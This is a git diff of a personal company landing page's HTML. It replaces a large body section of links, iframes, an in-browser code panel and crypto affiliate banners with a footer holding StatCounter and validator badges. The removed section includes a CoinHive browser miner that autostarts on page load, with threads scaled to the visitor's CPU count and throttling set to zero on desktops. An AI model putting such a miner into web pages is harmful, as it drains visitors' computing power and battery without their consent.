@@ -37,276 +37,62 @@
 	</h1>
 	</header>
 
-	<!-- body container -->
-	<section class="container">
-		<h2 class="hard-to-see"><abbr title="Landing/Home Page">LHP</abbr></h2>
-		<!-- Layout: -->
-		<!-- - Left -->
-		<!-- - Center -->
-		<!-- - Right -->
-
-		<div class="leftcolumn">
-			<!-- intra-site links -->
-			<nav>
-			<ul>
-			<li><a href="#">Home</a></li>
-			<li><a target="_blank" href="testing.html">Testing</a></li>
-			<li><a href="#" onclick="alert('not yet implemented'); return false">About</a></li>
-			<li><a href="#" onclick="alert('not yet implemented'); return false">Contact</a></li>
-			<li><a href="#" onclick="alert('not yet implemented'); return false">Sitemap</a></li>
-			</ul>
-			</nav>
-
-			<!-- our inter-site links -->
-			<nav>
-			<ul>
-			<li><a target="_blank" href="https://www.linkedin.com/company/InnovAnon-Inc">LinkedIn</a></li>
-			<li><a target="_blank" href="https://www.facebook.com/InnovAnon/">FaceBook</a></li>
-			<li><a target="_blank" href="https://innovanon.weebly.com/">Old Website</a></li>
-			</ul>
-			</nav>
-
-			<!-- other inter-site links -->
-			<nav>
-			<ul>
-			<li><a target="_blank" href="http://shaivitetemple.org/">Shaivite Temple</a></li>
-			<li><a target="#" onclick="alert('not yet implemented'); return false" href="">Vishnu Temple</a></li>
-			<li><a target="#" onclick="alert('not yet implemented'); return false" href="">Sikh Church</a></li>
-			</ul>
-			</nav>
-		</div> <!-- leftcolumn -->
-
-		<div class="centercolumn">
-
-		<!-- IDE -->
-		<div id="ide">
-		<section class="container">
-			<h3><abbr title="Integrated Development Environment">IDE</abbr></h3>
-			<!-- Layout: -->
-			<!-- - Left -->
-			<!-- - Right -->
-			<div class="leftcolumn">
-				<div>
-				<table> <!-- TODO don't use tables for layouts -->
-					<tr>
-						<td><button
-							onclick="clearConsole()">Clear Console</button></td>
-						<td><button
-							onclick="clearCanvas()">Clear Canvas</button></td>
-					</tr><tr>
-						<td><button
-							onclick="test()">Test</button></td>
-						<td><button
-							onclick="showCall(drawCircle, 'testing-canvas')">Circle</button></td>
-					</tr>
-				</table>
-				</div>
-				<div>
-				<textarea id="cnsl"
-						 rows="20" cols="80"
-						 autofocus="true"
-						 placeholder="(testing)"></textarea>
-				</div>
-				<div>
-				<table class="hard-to-see"> <!-- TODO don't use tables for layouts -->
-				<tr>
-					<td>Filename to Save As:</td>
-					<td><input id="inputFileNameToSaveAs"></td>
-					<td><button onclick="saveTextAsFile()">Save Text to File</button></td>
-				</tr>
-				<tr>
-					<td>Select a File to Load:</td>
-					<td><input type="file" id="fileToLoad"></td>
-					<td><button onclick="loadFileAsText()">Load Selected File</button></td>
-				</tr>
-				</table>
-				</div>
-				<script src="fm.js"></script>
-			</div> <!-- leftcolumn -->
-
-			<div class="rightcolumn">
-				<div>
-				<button id="execute-button"
-				 onclick="run()">Execute</button>
-				</div>
-				<div>
-				<!-- these numbers are selected for simpler JS calculations -->
-				<!-- the CSS scales this up a little so it aligns with Lord Shiva -->
-				<canvas id="testing-canvas"
-						width="200" height="200">
-				</canvas>
-				</div>
-			</div> <!-- rightcolumn -->
-
-			<div class="clear"></div>
-		</section>
-		</div> <!-- IDE -->
-		<script src="js-exec.js"></script>
-		<script src="testing.js"></script>
-
-		<!-- Geolocation -->
-		<!-- TODO this could be fun to play with -->
-		<div id="geolocation">
-			<button id="geolocation-button"
-					 onclick="getLocation()">Geolocate</button>
-		</div>
-		<script src="geolocation.js"></script>
-
-		<!-- Search DuckDuckGo -->
-		<!-- TODO reasonably incorporate optional anon browsing -->
-		<!-- e.g., http://anonymouse.org/anonwww.html -->
-		<!--<iframe src="https://duckduckgo.com/search.html?duck=yes&kn=1&site=https://innovanon-inc.github.io/LHP/&prefill=Search DuckDuckGo&bgcolor=000000" style="overflow:hidden;margin:0;padding:0;width:483px;height:60px;" frameborder="0">Search DuckDuckGo</iframe>-->
-		<div id="search-duckduckgo">
-		<iframe src="https://duckduckgo.com/search.html?duck=yes&kn=1&prefill=Search%20DuckDuckGo&bgcolor=000000"
-		         style="overflow:hidden;margin:0;padding:0;width:483px;height:60px;">
-			Search DuckDuckGo
-		</iframe>
-		</div>
-
-		<!-- Seva -->
-		<div id="seva" class="container">
-			<h3>Free Services</h3>
-			<!-- TODO clickable links -->
-			<ul class="hard-to-see">
-			<li>Free Tutoring</li>
-			<li>Free Code</li>
-			<li>Donate to Scientific Researchers</li>
-			<li>Free Lunch</li>
-			</ul>
-
-			<div class="leftcolumn">
-			<!-- Mibbit WebIRC Client -->
-			<div id="webirc-client">
-				<div>
-				<iframe width="550" height="350" scrolling="no"
-						 src="https://widget.mibbit.com/?settings=d8d241ba2cf985a43f95edc4f9282e68&server=irc.mibbit.net%3A%2B6697&channel=%23InnovAnon-Inc">
-					Mibbit WebIRC Client
-				</iframe>
-				</div>
-				<div>
+	<footer class="row">
+			<div class="column3">
 				<a target="_blank"
-				   href="https://widget.mibbit.com/?settings=d8d241ba2cf985a43f95edc4f9282e68&server=irc.mibbit.net%3A%2B6697&channel=%23InnovAnon-Inc">Mibbit WebIRC Client</a>
+				   href="https://validator.w3.org/check?uri=referer">
+				<img src="https://www.w3.org/Icons/valid-xhtml10"
+			         alt="Valid XHTML 1.0!" height="31" width="88" />
+				</a>
+			</div>
+
+			<div class="column3">
+				<!-- Start of StatCounter Code for Default Guide -->
+				<script type="text/javascript">
+				var sc_project=11577713; 
+				var sc_invisible=0; 
+				var sc_security="96cb80d4"; 
+				var scJsHost = (("https:" == document.location.protocol) ?
+				"https://secure." : "http://www.");
+				document.write("<sc"+"ript type='text/javascript' src='" +
+				scJsHost+
+				"statcounter.com/counter/counter.js'></"+"script>");
+				</script>
+				<noscript>
+				<div class="statcounter">
+					<a title="Web Analytics"
+					   href="https://statcounter.com/" target="_blank"><img
+					   class="statcounter"
+					   src="//c.statcounter.com/11577713/0/96cb80d4/0/" alt="Web Analytics"></a>
 				</div>
+				</noscript>
+				<!-- End of StatCounter Code for Default Guide -->
+				<a target="_blank" href="https://statcounter.com/p11577713/?guest=1">View My
+				Stats</a>
 			</div>
 
-			<!-- BoincStats -->
-			<div id="boinc-stats">
-			<a target="_blank" href="https://boincstats.com/en/page/profile/user/114433">
-			<img src="https://boincstats.com/signature/-1/user/2354783/sig.png"
-				 alt="Computational Resources Donated to Science"
-				 style="width: 355px; height=140px">
-			</a>
+			<div class="column3">
+				<a target="_blank"
+					href="https://github.com/InnovAnon-Inc/LHP">
+				<svg aria-hidden="true" class="octicon octicon-mark-github" height="32" version="1.1" viewBox="0 0 16 16" width="32"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"></path></svg>
+				</a>
 			</div>
-			</div> <!-- leftcolumn -->
-
-			<div class="rightcolumn">
-			<div id="code-seva">
-			<a target="_blank"
-			   href="https://github.com/InnovAnon-Inc">
-			<svg aria-hidden="true" class="octicon octicon-mark-github" height="32" version="1.1" viewBox="0 0 16 16" width="32"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"></path></svg>
-			</a>
-			</div>
-
-			<!-- TODO donated FOSS (i.e., GitHub Stats) -->
-
-			<!-- Indeed Job Recruiter -->
-			<!-- this is a quick link for personal use -->
-			<!-- will need to contact me directly -->
-			<!--<iframe src="https://crowd.indeed.com/jobs">Indeed Job Recruiter</iframe>-->
-			<div id="indeed-job-recruiter">
-			<a target="_blank"
-			   href="https://crowd.indeed.com/jobs?from=email_alert">
-			<img src="https://crowd.indeed.com/static/img/favicon.ico?291817201217"
-				  alt="Indeed Job Recruiter"
-				  style="width: 16px; height: 16px">
-			</a>
-			</div>
-			</div> <!-- rightcolumn -->
-
-			<div class="clear"></div>
-		</div>
-
-		<!-- TODO -->
-		<!--<div w3-include-html="graphics.html"></div>-->
-		<!--<script src="graphics.js"></script>-->
-
-		</div> <!-- centercolumn -->
-
-		<aside class="rightcolumn">
-
-		<!-- CoinHive Miner -->
-		<!-- data-threads="1"
-			 data-throttle="0.7" -->
-		<!-- data-threads="2"
-			 data-throttle="0.3" -->
-		<div id="coinhive" class="coinhive-miner"
-			 style="width: 256px; height: 310px"
-			 data-key="Ansnx3ssG1KPPjbVHMIikQP9APAZYIio"
-			 data-autostart="true"
-			 data-threads="4"
-			 data-throttle="0.1"
-			 data-background="#000000"
-			 data-text="#eeeeee"
-			 data-action="#00ff00"
-			 data-graph="#555555">
-		<em>Loading...</em>
-		</div>
-		<script>
-		var d = document.getElementById('coinhive');
-		var p = navigator.hardwareConcurrency || 4;
-		if (/Mobile|Android|webOS|iPhone|iPad|iPod|BlackBerry|BB|PlayBook|IEMobile|Windows Phone|Kindle|Silk|Opera Mini/i.test(navigator.userAgent)) {
-			d.setAttribute('data-threads', p);
-			d.setAttribute('data-throttle', 0.3);
-		} else {
-			d.setAttribute('data-threads', p * 2);
-			d.setAttribute('data-throttle', 0.0);
-		}
-		</script>
-
-		<!-- Genesis Mining Affiliate -->
-		<div id="genesis-mining">
-		<a target="_blank"
-		   href="https://www.genesis-mining.com/a/YzB2c8">
-		<img src="GM-Affiliate_Banners-First_Release-250x250-21.png"
-			 alt="Mine Bitcoin the smart way!"
-			 style="width: 250px; height: 250px">
-		</a>
-		</div>
-
-		<div id="cryptocompare">
-			<a target="_blank"
-			   href="https://www.cryptocompare.com/coins/xmr/overview">
-			<img src="xmr.png"
-			     alt="CryptoCompare Monero"
-			     style="width: 16px; height 16px">
-			</a>
-			<a target="_blank"
-			   href="https://www.cryptocompare.com/coins/btc/overview">
-			<img src="btc.png"
-			     alt="CryptoCompare Bitcoin"
-			     style="width: 16px; height 16px">
-			</a>
-		</div>
-
-		<!-- Patreon -->
-		<div id="become-a-patron">
-			<a target="_blank"
-			   role="button"
-			   href="https://www.patreon.com/bePatron?c=1001199"
-			   data-test-tag="become-patron-button">
-			<div class="image">
-			<img src="offeringplate2-640x360.jpg"
-				  alt="Become a patron"
-				  style="width: 250px; height: 250px">
-			<div class="image-text"><span>Become a patron</span></div>
-			</div>
-			</a>
-		</div>
-
-		</aside> <!-- rightcolumn -->
-		
-		<div class="clear"></div>
-	</section> <!-- body container -->
+	</footer>
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
 
 	<footer>
 	<div class="container">
